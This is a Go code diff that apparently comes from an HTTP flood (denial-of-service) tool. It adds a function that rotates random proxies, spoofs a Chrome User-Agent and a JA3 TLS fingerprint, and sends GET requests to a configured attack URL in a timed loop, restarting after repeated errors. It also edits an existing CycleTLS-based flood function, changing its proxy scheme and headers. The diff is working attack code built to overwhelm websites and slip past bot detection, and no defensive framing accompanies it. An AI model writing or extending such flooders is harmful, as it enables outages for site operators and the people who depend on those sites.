@@ -3,6 +3,8 @@ package main
 import (
 	"fmt"
 	"github.com/Danny-Dasilva/CycleTLS/cycletls"
+	"github.com/wangluozhe/requests"
+	url "github.com/wangluozhe/requests/url"
 	"golang.org/x/net/http2"
 	"math/rand"
 	"net/http"
@@ -80,6 +82,34 @@ restart:
 	}
 }
 
+func TLS_HTTP2_ChineseVersion(wg *sync.WaitGroup) {
+	var errs int
+	errs = -1
+restart:
+	req := url.NewRequest()
+	req.Proxies = LoadedProxies[rand.Intn(len(LoadedProxies))]
+	headers := url.NewHeaders()
+	headers.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36")
+	req.Headers = headers
+	req.Ja3 = Sys.Attack.Ja3
+	if errs == -1 {
+		wg.Done()
+		<-start
+	}
+	for range time.Tick(time.Millisecond * time.Duration(1000.0/Sys.Attack.RequestsPerIP)) {
+		fmt.Println("beforeRequest")
+		_, err := requests.Get(Sys.Attack.Url, req)
+		fmt.Println("request")
+		if err != nil {
+			errs++
+			if errs > 10 {
+				errs = 0
+				goto restart
+			}
+		}
+	}
+}
+
 func TLS_HTTP2(wg *sync.WaitGroup) {
 	var errs int
 	errs = -1
@@ -89,15 +119,15 @@ restart:
 	if Sys.Attack.Host != "" {
 		headers["Host"] = Sys.Attack.Host
 	}
-	headers["sec-ch-ua-mobile"] = "?0"
+	/*headers["sec-ch-ua-mobile"] = "?0"
 	headers["upgrade-insecure-requests"] = "1"
 	headers["cache-control"] = "max-age=0"
 	headers["sec-fetch-mode"] = "navigate"
 	headers["sec-fetch-user"] = "?1"
-	headers["sec-fetch-dest"] = "document"
+	headers["sec-fetch-dest"] = "document"*/
 	client := cycletls.Init()
 	options := cycletls.Options{
-		Proxy:     "http://" + proxy,
+		Proxy:     "https://" + proxy,
 		Ja3:       Sys.Attack.Ja3,
 		UserAgent: UserAgents[rand.Intn(len(UserAgents))],
 		//Headers:   headers,
@@ -108,6 +138,7 @@ restart:
 		<-start
 	}
 	for range time.Tick(time.Millisecond * time.Duration(1000.0/Sys.Attack.RequestsPerIP)) {
+		fmt.Println("beforeRequest")
 		_, err := client.Do(Sys.Attack.Url, options, Sys.Attack.AttackMethod)
 		fmt.Println("request")
 		if err != nil {
